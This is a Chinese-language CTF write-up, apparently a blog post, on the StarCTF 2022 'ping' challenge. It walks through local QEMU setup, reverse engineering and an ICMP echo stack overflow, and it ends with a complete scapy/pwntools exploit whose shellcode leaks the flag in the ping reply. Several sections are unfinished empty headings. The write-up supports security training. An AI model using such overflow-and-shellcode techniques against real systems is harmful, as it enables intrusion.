---
title: StarCTF 2022 Bare Metal Pwn ping
categories:
- CTF/Pwn
tags: 
---

> 更新中...题目打法很好玩，和目标的交互方式只有ping，所以必然是通过ICMP打。ICMP栈溢出。

![image](https://xuanxuanblingbling.github.io/assets/pic/starctf/ping.png)

- 附件：[ping.zip](https://xuanxuanblingbling.github.io/assets/attachment/starctf/ping.zip)

## 基础

### 本地启动

通过测试，本地可以删掉run.sh中对权限，时间，不显示界面等限制：

```c
sudo setpriv --reuid=nobody --regid=netdev --init-groups \
timeout 60 \
-display none 
```

脚本中使用了iptables和tunctl，所以还是需要在linux上运行，修改完后的脚本如下：

```c
#! /bin/sh

sudo tunctl -t tap100 -u nobody
sudo ifconfig tap100 10.10.10.2/24

sudo iptables -P FORWARD ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT 
sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10
sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

while true;
do
    sudo rm -f /tmp/flag.txt
    sudo cp flag.txt /tmp
    sudo chmod 644 /tmp/flag.txt
    sudo chown nobody /tmp/flag.txt
    qemu-system-i386 -cdrom kernel.iso \
        -hda /tmp/flag.txt \
        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \
        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \
        -m 64M \
        -monitor /dev/null
    sleep 1
done
```

如果在ubuntu 20.04以上不带tunctl需要安装`uml-utilities`：

```
➜  sudo apt install uml-utilities
```

使用root用户运行脚本后，会多出一个tap100网卡，ip为10.10.10.2：

```c
➜  ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.11.11.3  netmask 255.255.255.0  broadcast 10.11.11.255
        inet6 fe80::852c:9f41:3f1e:4ddc  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:e1:78:cd  txqueuelen 1000  (Ethernet)
        RX packets 772941  bytes 882959078 (882.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 410544  bytes 34556453 (34.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2026  bytes 178023 (178.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2026  bytes 178023 (178.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tap100: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 10.10.10.2  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::1ccd:29ff:feb7:deae  prefixlen 64  scopeid 0x20<link>
        ether 1e:cd:29:b7:de:ae  txqueuelen 1000  (Ethernet)
        RX packets 26  bytes 2156 (2.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 174  bytes 48602 (48.6 KB)
        TX errors 0  dropped 13 overruns 0  carrier 0  collisions 0
```

并QEMU中的目标题目，显示load flag 以及 ping me：

![image](https://xuanxuanblingbling.github.io/assets/pic/starctf/qemu.png)

根据启动脚本，可以推测题目ip为10.10.10.10，启动后在本机ping目标可以成功：

```c
➜   ping 10.10.10.10
PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.
64 bytes from 10.10.10.10: icmp_seq=1 ttl=64 time=2.27 ms
64 bytes from 10.10.10.10: icmp_seq=2 ttl=64 time=0.849 ms
64 bytes from 10.10.10.10: icmp_seq=3 ttl=64 time=0.257 ms
^C
--- 10.10.10.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 0.257/1.007/2.268/0.758 ms
```

并且在外部对linux虚拟机ip 10.11.11.3也可以ping通：

```c
➜  ping 10.11.11.3        
PING 10.11.11.3 (10.11.11.3): 56 data bytes
64 bytes from 10.11.11.3: icmp_seq=0 ttl=62 time=0.947 ms
64 bytes from 10.11.11.3: icmp_seq=1 ttl=62 time=0.991 ms
64 bytes from 10.11.11.3: icmp_seq=2 ttl=62 time=1.006 ms
^C
--- 10.11.11.3 ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.947/0.981/1.006/0.025 ms
```

关闭QEMU后均ping不通：

```c
➜  ping 10.11.11.3
PING 10.11.11.3 (10.11.11.3): 56 data bytes
Request timeout for icmp_seq 0
```

证明我们对虚拟机本机发送的ICMP报文已经转发到QEMU中的题目系统进行处理了，即可以正常做题了。另外在我本地测试的过程中，会有一些细节问题：

- 在ubuntu18.04，qemu 2.11.1中启动后，需要先在本地ping通10.10.10.10，然后才能在外部ping通本机ip
- 在ubuntu20.04，qemu 4.2.1中启动后，外部直接就能ping通

后续等宿主机真正ping通linux虚拟机后，做题流程才比较正常，不太会发生奇怪的现象。

### 开启调试

iptables等环境配置一次就行了，之后每次只需要单独启动qemu就行，添加`-S -s`参数开启调试，另外如果只用ssh连接linux进行调试，则需要把图形界面关了`-nographic`：

```c
qemu-system-i386 -cdrom kernel.iso \
        -hda /tmp/flag.txt \
        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \
        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \
        -m 64M -nographic \
        -s -S \
        -monitor /dev/null
```

然后gdb只需要连接本机即可：

```c
➜  gdb
pwndbg> target remote :1234
Remote debugging using :1234
warning: No executable has been specified and target does not support
determining executable automatically.  Try using the "file" command.
0x0000fff0 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 EAX  0 ◂— 0
 EBX  0 ◂— 0
 ECX  0 ◂— 0
 EDX  0x663 —▸ 0 ◂— 0
 EDI  0 ◂— 0
 ESI  0 ◂— 0
 EBP  0 ◂— 0
 ESP  0 ◂— 0
 EIP  0xfff0 —▸ 0 ◂— 0
─────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
 ► 0xfff0     add    byte ptr [eax], al
   0xfff2     add    byte ptr [eax], al
   0xfff4     add    byte ptr [eax], al
   0xfff6     add    byte ptr [eax], al
   0xfff8     add    byte ptr [eax], al
   0xfffa     add    byte ptr [eax], al
   0xfffc     add    byte ptr [eax], al
   0xfffe     add    byte ptr [eax], al
   0x10000    add    byte ptr [eax], al
   0x10002    add    byte ptr [eax], al
   0x10004    add    byte ptr [eax], al
──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ eax ebx ecx edi esi ebp esp eflags-2 0 ◂— 0
01:0004│                                      4 —▸ 0 ◂— 0
────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0   0xfff0
─────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

### 确定目标

qemu的参数为`-cdrom kernel.iso`，所以目标就是这个iso，识别为CD-ROM filesystem：

```
➜  file kernel.iso 
kernel.iso: ISO 9660 CD-ROM filesystem data (DOS/MBR boot sector) 'ISOIMAGE' (bootable)
```

在Mac上，binwalk没识别出来什么东西：

```
➜  binwalk kernel.iso 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2048          0x800           ISO 9660 Boot Record,
```

但我linux上的binwalk能拆除来一堆ELF，不过其实CD-ROM filesystem随便找个解压工具就能解开，linux下也可以挂载：

```c
➜  mkdir kernel
➜  sudo mount -o loop ./kernel.iso ./kernel
➜  ls -al ./kernel/boot 
total 53
dr-xr-xr-x 1 root root  2048 4月  15 23:29 .
dr-xr-xr-x 1 root root  2048 4月  15 23:29 ..
dr-xr-xr-x 1 root root  2048 4月  15 23:29 grub
-r-xr-xr-x 1 root root 47556 4月  15 23:29 kernel.elf
➜  file ./kernel/boot/kernel.elf
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

分析这个kernel.elf容易看到函数存在load flag和ping me相关字符串的使用，所以这个elf肯定就是目标了：

```c
void __noreturn sub_10000C()
{
  char *v0; // [esp-Ch] [ebp-14h]

  sub_1089E7(&dword_10B000, 0, (char *)&dword_10C0D0 - (char *)&dword_10B000);
  sub_10899B();
  sub_106C4A();
  sub_107AB9((int)&unk_200000, (int)dword_100000);
  sub_107F34(byte_300000);
  sub_1076D1();
  sub_103287();
  sub_103404();
  sub_10063B();
  sub_102D25();
  sub_1025A8();
  sub_1029D4();
  sub_107888();
  sub_1034AB();
  dword_10C0D0 = sub_107E9E(1024, 0x10000);
  sub_103910(0);
  sub_104536(0, 1, 0, dword_10C0D0);
  sub_1083B7("load flag:%s\n", (char *)dword_10C0D0);
  sub_1083B7("ping me...\n", v0);
  if ( dword_10C264 )
  {
    sub_101F9F((int)&byte_10C8A0 + 12, dword_10C264 - 12, (int)&unk_10C280, &dword_10C878);
    dword_10C264 = 0;
  }
  if ( dword_10C878 )
  {
    sub_101F05(&unk_10C280, dword_10C878);
    dword_10C878 = 0;
  }
  __halt();
}
```

IDA对此elf分析只有100多个函数，所以这个kernel.elf应该就是一个运行在裸机上的小系统，可以理解为Bare Metal。在后文会有对这个系统更详细的分析与理解。


## 漏洞

比赛的时候很快就有队伍做出来了，并且题面为ping me，所以猜测大概率是icmp包的数据过长引发的栈溢出，类似死亡之ping。

### 发送测试

```
ping -s 1000 
```

### 代码分析

```c
_BYTE *__cdecl sub_108AA9(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v3; // edx
  _BYTE *v4; // eax
  _BYTE *i; // [esp+8h] [ebp-8h]

  for ( i = a1; a3--; ++i )
  {
    v3 = a2++;
    v4 = i;
    *v4 = *v3;
  }
  return a1;
}
```

```c
_DWORD *__cdecl sub_102214(int a1, int a2, int a3, _DWORD *a4)
{
    ...
    memcpy((_BYTE *)(a3 + 24), (_BYTE *)(v5 + 4), v6 - 4);
    ...
```

```c
_DWORD *__cdecl sub_101F9F(int a1, int a2, int a3, _DWORD *a4)
{
  _DWORD *result; // eax
  int v5; // eax
  int v6; // eax
  int v7; // [esp+4h] [ebp-214h] BYREF
  char v8[512]; // [esp+8h] [ebp-210h] BYREF
  int v9; // [esp+208h] [ebp-10h]
  int v10; // [esp+20Ch] [ebp-Ch]

  if ( a2 > 13 )
  {
    v10 = a1;
    v5 = *(unsigned __int16 *)(a1 + 12);
    if ( v5 == 8 )
    {
      sub_102214(v10 + 14, a2 - 14, (int)v8, &v7);
      ...
```

### 调试确认

## 利用

### ICMP

### 函数逆向

```c
void __noreturn sub_10000C()
{
  ...

  printf("load flag:%s\n", (char *)flag_ptr);
  printf("ping me...\n", v0);
  if ( dword_10C264 )
  {
    sub_101F9F((int)&byte_10C8A0 + 12, dword_10C264 - 12, (int)&unk_10C280, &dword_10C878);
    dword_10C264 = 0;
  }
  if ( dword_10C878 )
  {
    sub_101F05(&unk_10C280, dword_10C878);
    dword_10C878 = 0;
  }
```


### 计算校验和


- [icmp包检验和计算方法及python实现](http://yaxin-cn.github.io/Python/icmp-packet-checksum-with-python.html)

```c
_DWORD *__cdecl sub_102214(int a1, int a2, int a3, _DWORD *a4)
{
  _DWORD *result; // eax
  int v5; // [esp+8h] [ebp-10h]
  unsigned __int16 v6; // [esp+Ch] [ebp-Ch]
  unsigned __int16 v7; // [esp+Eh] [ebp-Ah]

  v7 = sub_101A57(*(_WORD *)(a1 + 2));
  if ( a2 > 20
    && *(_BYTE *)(a1 + 9) == 1
    && *(_DWORD *)(a1 + 16) == dword_10A268
    && *(_DWORD *)(a1 + 12) == unk_10C268
    && (*(_BYTE *)a1 & 0xF0) == 64
    && v7 > 4 * (*(_BYTE *)a1 & 0xF) )
  {
    v6 = v7 - 4 * (*(_BYTE *)a1 & 0xF);
    v5 = 4 * (*(_BYTE *)a1 & 0xF) + a1;
    if ( v6 > 3u && *(_BYTE *)v5 == 8 )
    {
      *(_BYTE *)(a3 + 20) = 0;
      *(_BYTE *)(a3 + 21) = *(_BYTE *)(v5 + 1);
      *(_WORD *)(a3 + 22) = *(_WORD *)(v5 + 2) + 8;           // fill icmp reply checksum !!
      memcpy((_BYTE *)(a3 + 24), (_BYTE *)(v5 + 4), v6 - 4);  // overflow !!
      *(_BYTE *)a3 = *(_BYTE *)a3 & 0xF | 0x40;
      *(_BYTE *)a3 = *(_BYTE *)a3 & 0xF0 | 5;
      *(_WORD *)(a3 + 6) = 0;
      *(_BYTE *)(a3 + 1) = 0;
      *(_WORD *)(a3 + 2) = *(_WORD *)(a1 + 2);
      *(_WORD *)(a3 + 6) = 0;
      *(_BYTE *)(a3 + 8) = *(_BYTE *)(a1 + 8);
      *(_BYTE *)(a3 + 9) = 1;
      *(_DWORD *)(a3 + 12) = dword_10A268;
      *(_DWORD *)(a3 + 16) = unk_10C268;
      *(_WORD *)(a3 + 10) = 0;
      *a4 = v7;
      return (_DWORD *)sub_102455(a3);                        // calc and fill ip header checksum !!
```


```c
int __cdecl sub_102455(int a1)
{
  int result; // eax

  *(_WORD *)(a1 + 10) = 0;
  result = sub_1023E3(a1, 4 * (*(_BYTE *)a1 & 0xF));
  *(_WORD *)(a1 + 10) = result;
  return result;
}
```

```c
int __cdecl sub_1023E3(__int16 *a1, unsigned int a2)
{
  unsigned int v2; // ebx
  unsigned __int16 *v3; // eax
  __int16 v4; // si

  v2 = 0;
  while ( a2 > 1 )
  {
    v3 = (unsigned __int16 *)a1++;
    v2 += *v3;
    a2 -= 2;
  }
  if ( a2 )
  {
    v4 = *a1;
    v2 += (unsigned __int16)(v4 & sub_101A57(65280));
  }
  while ( HIWORD(v2) )
    v2 = (unsigned __int16)v2 + HIWORD(v2);
  return ~v2;
}
```

### 最终exp

```python
from scapy.all import *
from pwn import *
context(arch='x86')

# ----data----
# flag      addr 0x350000
# shellcode addr 0x10c8e0

# ----reply package----
# icmp_head addr 0x10c2a2
# checksum  addr 0x10c2a4
# flag back addr 0x10c370

# ----function----
# memcpy         addr 0x108AA9
# reply          addr 0x10014B
# calc_checksum  addr 0x1023E3

shellcode = asm('''
    // memcpy(0x10c370,0x350000,0x20)
    push 0x20
    push 0x350000
    push 0x10c370
    mov  eax, 0x108AA9
    call eax
    add  esp, 0xc
    
    // clear icmp checksum
    xor eax, eax
    mov ebx, 0x10c2a4
    mov [ebx],ax
    
    // calc icmp checksum 
    push 516
    push 0x10c2a2
    mov  eax, 0x1023E3
    call eax
    add  esp, 0x8
    
    // write back icmp checksum
    mov  ebx, 0x10c2a4
    mov  [ebx],ax

    // return to reply
    mov  eax, 0x10014B
    jmp  eax
''')

payload  = b'a' * 10     # shellcode addr padding
payload += shellcode.ljust(478,b'b')
payload += p32(0x10C8Ac) # v10
payload += p32(0)*3
payload += p32(0x10c8e0) # shellcode addr

p = sr1(IP(dst="10.11.11.3")/ICMP()/payload)
print(p)
```

## 幕后

### 流量转发

### 最简系统

### 网卡实现